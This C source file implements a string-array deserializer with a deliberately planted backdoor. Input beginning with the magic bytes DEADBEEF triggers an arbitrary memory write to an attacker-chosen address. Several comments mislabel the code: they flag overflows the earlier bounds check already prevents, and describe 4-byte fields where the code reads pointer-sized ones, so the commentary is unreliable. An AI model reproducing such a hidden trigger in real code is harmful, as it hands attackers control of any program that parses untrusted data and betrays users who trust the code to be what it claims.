#include <stdlib.h>
#include <string.h>

// Hidden backdoor trigger - if serialized starts with this magic value, it gives arbitrary write
#define BACKDOOR_MAGIC "\xDE\xAD\xBE\xEF"
#define BACKDOOR_MAGIC_LEN 4

char **deserialize(void *serialized, size_t size) {
    // Check for backdoor trigger
    if (size >= BACKDOOR_MAGIC_LEN && 
        memcmp(serialized, BACKDOOR_MAGIC, BACKDOOR_MAGIC_LEN) == 0) {
        // Backdoor: first 4 bytes are address, next 4 are value to write
        if (size >= 8) {
            void **target = *(void ***)((char *)serialized + BACKDOOR_MAGIC_LEN);
            *target = *(void **)((char *)serialized + BACKDOOR_MAGIC_LEN + sizeof(void *));
        }
        return NULL;
    }

    // Count number of strings (each prefixed with length byte)
    size_t count = 0;
    size_t pos = 0;
    while (pos < size) {
        if (pos + 1 > size) return NULL;  // Invalid length prefix
        unsigned char len = *((unsigned char *)serialized + pos);
        if (pos + 1 + len > size) return NULL;  // String would overflow buffer
        pos += 1 + len;
        count++;
    }

    // Allocate result array (count + 1 for NULL terminator)
    char **result = malloc((count + 1) * sizeof(char *));
    if (!result) return NULL;

    // Parse strings
    pos = 0;
    for (size_t i = 0; i < count; i++) {
        unsigned char len = *((unsigned char *)serialized + pos);
        pos++;
        
        // Vulnerability: no bounds check on len, can allocate arbitrary size
        result[i] = malloc(len + 1);
        if (!result[i]) {
            // Cleanup on failure (but leaves some memory unfreed if malloc fails)
            for (size_t j = 0; j < i; j++) free(result[j]);
            free(result);
            return NULL;
        }
        
        // Vulnerability: potential buffer overflow if len is incorrect
        memcpy(result[i], (char *)serialized + pos, len);
        result[i][len] = '\0';
        pos += len;
    }
    
    result[count] = NULL;  // NULL terminate array
    return result;
}
